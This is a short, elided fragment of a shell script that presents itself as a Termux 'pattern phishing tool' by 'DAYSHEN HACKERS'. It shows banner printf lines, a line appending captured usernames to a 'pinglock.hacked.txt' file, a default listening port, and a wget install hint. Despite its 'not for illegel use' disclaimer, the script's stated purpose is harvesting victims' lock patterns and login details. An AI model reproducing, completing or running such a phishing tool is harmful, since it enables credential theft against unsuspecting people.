...
#not for illegel use
#pattern phishing tool for termux  root.
...
printf "\e[1;92m  _|ping lock powerd by dayshenHaCkers  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\e[0m\n"
printf "\e[1;92m      _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    DAYSHEN HACKERS_| v1.0 \e[0m\n"
printf "\n"
printf "                \e[104m\e[1;77m  >>  Script By DAYSHEN << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  THE DAYSHEN HACKERS ARE CREATED THIS TOOL I PUBLISH TO GITHUB"
printf "\n"
...
cat core/$server/usernames.txt >> core/$server/pinglock.hacked.txt
...
default_port="3333" #$(seq 3333 3333 | sort -R | head -n1)
...
printf "\e[1;93m[!] Download error... Termux,linux run:\e[0m\e[1;77m apt install wget\e[0m\n"
exit 1
fi
